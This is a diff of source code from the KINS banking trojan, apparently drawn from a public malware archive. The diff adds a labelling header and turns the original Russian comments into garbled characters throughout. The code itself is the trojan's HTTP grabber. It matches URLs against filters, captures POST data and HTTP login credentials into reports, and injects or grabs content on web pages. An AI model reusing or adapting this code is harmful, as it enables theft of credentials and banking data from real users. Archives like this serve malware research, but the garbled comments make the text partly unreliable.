@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 #include <wininet.h>
@@ -155,12 +166,12 @@ static bool isThereCC(LPSTR postData, int postDataSize)
 }
 
 /*
-	Проверка запроса на необходимость инжекта.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	IN OUT requestData - запрос.
+	IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	Return             - true - инжекты применины,
-	false - инжекты не применены
+	Return             - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -181,13 +192,13 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 
 		while(HttpInject::_isCorrectHeader(curInject))
 		{
-			LPSTR p          = (LPSTR)curInject; //Переменная для легокого доступа к строкам.
+			LPSTR p          = (LPSTR)curInject; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			LPSTR urlMask    = p + curInject->urlMask;
 			DWORD matchFlags = curInject->flags &  HttpInject::FLAG_URL_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
 
 			if((curInject->flags & knownFlags) == knownFlags && HttpGrabber::_matchUrlA(urlMask, requestData->url, requestData->urlSize, matchFlags))
 			{
-				//Проверяем пост-данные.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 				if(curInject->postDataBlackMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataBlackMask, (LPSTR)requestData->postData, requestData->postDataSize) == true)
 				{
 					goto SKIP_ITEM;
@@ -198,7 +209,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 				}
 
 
-				//Все хорошо, собираем данные.
+				//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					HttpGrabber::INJECTFULLDATA ifd;
 #if defined WDEBUG2
@@ -233,7 +244,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 							break;
 						}
 					}
-					//Неизвестно.
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 					else 
 					{
 						HttpGrabber::_freeInjectFullData(&ifd);
@@ -246,7 +257,7 @@ static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 SKIP_ITEM:;
 			}
 
-			//Вычисляем следующий элемент.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			curInject = (HttpInject::HEADER *)(((LPBYTE)curInject) + curInject->size);
 			if(((LPBYTE)curInject) + sizeof(HttpInject::HEADER) > endOfList || ((LPBYTE)curInject) + curInject->size > endOfList)break;
 			index++;
@@ -299,7 +310,7 @@ static bool checkRequestForCapchas(HttpGrabber::REQUESTDATA *requestData)
 				break;
 			}
 
-			//Вычисляем следующий элемент.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			curCaptcha = (HttpInject::CAPTCHAENTRY *)(((LPBYTE)curCaptcha) + curCaptcha->size);
 			if(((LPBYTE)curCaptcha) + sizeof(HttpInject::CAPTCHAENTRY) > endOfList || ((LPBYTE)curCaptcha) + curCaptcha->size > endOfList)
 				break;
@@ -327,9 +338,9 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 	//SpyEye_Modules::WebMainCallback(SpyEye_Modules::SM_FUNC_BEFOREPROCESSURL, requestData->url, requestData->verb == HttpGrabber::VERB_GET ? "GET" : "POST",requestData->
 
 	DWORD retVal = 0;
-	signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;
+	signed char writeReport = -1;/*-1 - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 0 - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, 1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ*/;
 
-	//Проверяем запрос по фильтру.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(requestData->currentConfig != NULL)
 	{
 		DWORD httpFilterSize;
@@ -340,19 +351,19 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 			LPSTR curFilter = httpFilter;
 			do if(curFilter[1] != 0)
 			{ 
-				//Опеределяем тип фильтра.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				char filterType;
 				switch(curFilter[0])
 				{
 					case '$': filterType = 5; break; //Notify our server about request.
-					case '!': filterType = 1; break; //Не писать в отчет,
+					case '!': filterType = 1; break; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ,
 					case '@': filterType = 2; break; //Screenshots
-					default:  filterType = 0; break; //Принудительно писать в отчет.
+					default:  filterType = 0; break; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 				}
 				if(filterType != 0)
 					curFilter++;
 
-				//Сравниваем URL.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL.
 				if(_matchUrlA(curFilter, requestData->url, requestData->urlSize, 0))
 				{
 #if defined WDEBUG3
@@ -403,7 +414,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 		Mem::free(httpFilter);
 	}
 
-	//Проверяем тип содержимого.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(requestData->contentTypeSize >= (CryptedStrings::len_httpgrabber_urlencoded - 1))
 	{
 		if(CSTR_EQNA(requestData->contentType, CryptedStrings::len_httpgrabber_urlencoded - 1, httpgrabber_urlencoded) &&
@@ -412,7 +423,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 			retVal |= HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED;
 	}
 	
-	//Проверяем наличие HTTP-авторизации.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	LPWSTR authorizationData  = NULL;
 	int authorizationDataSize = 0;
 	if(requestData->authorizationData.userName != NULL && *requestData->authorizationData.userName != 0 && requestData->authorizationData.password != NULL && *requestData->authorizationData.password != 0)
@@ -430,10 +441,10 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 	{
 		retVal |= ANALIZEFLAG_AUTHORIZATION;
 		
-		// тут нужно проверять на дубли авторизации
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	}
 	
-	//Опеределям нужно ли писать отчет.  
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.  
 	{    
 		if(writeReport == -1 && (requestData->verb == VERB_POST && requestData->postDataSize > 0) || retVal & ANALIZEFLAG_AUTHORIZATION)
 			retVal |= ANALIZEFLAG_SAVED_REPORT;
@@ -446,7 +457,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 		LPSTR postData = NULL;
 		bool ok = false;
 
-		//Форматируем POST-запрос.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
 		if(retVal & HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED)
 		{
 			if((postData = Str::_CopyExA((LPSTR)requestData->postData, requestData->postDataSize)) != NULL)
@@ -464,7 +475,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 		//	postData = NULL;
 		//}
 
-		//Формируем отчет.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 		if(postData != NULL)
 		{
 			LPWSTR urlUnicode = Str::_ansiToUnicodeEx(requestData->url, requestData->urlSize);
@@ -506,7 +517,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 	Mem::free(authorizationData);
 
 	
-	//Проверка на инжекты и фейки.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 	if(checkRequestForInject(requestData))
 	{
 		retVal |= ANALIZEFLAG_URL_INJECT;
@@ -538,14 +549,14 @@ END:
 
 bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count)
 {
-	DWORD changesCount = 0; //Кол. примененых инжектов.
+	DWORD changesCount = 0; //пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	
 	for(DWORD i = 0; i < count; i++)
 	{
 		INJECTFULLDATA *curData = (INJECTFULLDATA *)&dataList[i];
 		DWORD matchFlags = curData->flags & HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
 
-		//Проверка маски контента.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if(curData->contextMask != NULL && !_matchContextA(curData->contextMask, *context, *contextSize, matchFlags | Str::MATCH_FULL_EQUAL))
 		{
 #if defined WDEBUG0
@@ -559,17 +570,17 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 		LPBYTE curBlock        = (LPBYTE)curData->injects;
 		LPBYTE endBlock        = curBlock + curData->injectsSize;
 
-		//Применяем инжекты, грабим данные.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 		while(curBlock < endBlock)
 		{
-			//Ищим место замены.
-			DWORD offsetBegin; //Начало данных для замены.
-			DWORD offsetEnd;   //Конец данных для замены.
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+			DWORD offsetBegin; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+			DWORD offsetEnd;   //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			HttpInject::INJECTBLOCK *blockPrefix = (HttpInject::INJECTBLOCK *)curBlock;
 			HttpInject::INJECTBLOCK *blockPostfix  = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPrefix + blockPrefix->size);
 			HttpInject::INJECTBLOCK *blockNew    = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPostfix + blockPostfix->size);
 
-			curBlock = (LPBYTE)blockNew + blockNew->size; //Следующий элемент.
+			curBlock = (LPBYTE)blockNew + blockNew->size; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 			//FIXME
 			{
@@ -648,7 +659,7 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 				}
 			}
 
-			//Получаем позицию начала.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))
 			{
 				offsetBegin = 0;
@@ -658,7 +669,7 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 				continue;
 			}
 
-			//Получаем позицию конца.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 			if(blockPostfix->size == sizeof(HttpInject::INJECTBLOCK))
 			{
 				if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))offsetEnd = *contextSize;
@@ -674,16 +685,16 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 				continue;
 			}      
 
-			DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //Размер ставляемых данных.
-			DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //Размер наденых данных.
+			DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+			DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-			//Замена.
+			//пїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(curData->flags & HttpInject::FLAG_IS_INJECT)
 			{
 				DWORD newSize = *contextSize - matchedDataSize + blockNewDataSize;
 				LPBYTE newBuf  = (LPBYTE)Mem::alloc(newSize);
 
-				if(newBuf != NULL) //Не обращаем внимание на ошибку.
+				if(newBuf != NULL) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					Mem::_copy(newBuf,                                  *context,                                           offsetBegin);
 					Mem::_copy(newBuf + offsetBegin,                    (LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNewDataSize);
@@ -697,10 +708,10 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 					changesCount++;
 				}
 			}
-			//Сохранение.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			else if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
 			{
-				if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //Не обращаем внимание на ошибку.
+				if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					if(blockNewDataSize > 0)
 					{
@@ -718,7 +729,7 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
 			}
 		}
 
-		//Пишим награбленное.
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
 		{
 			
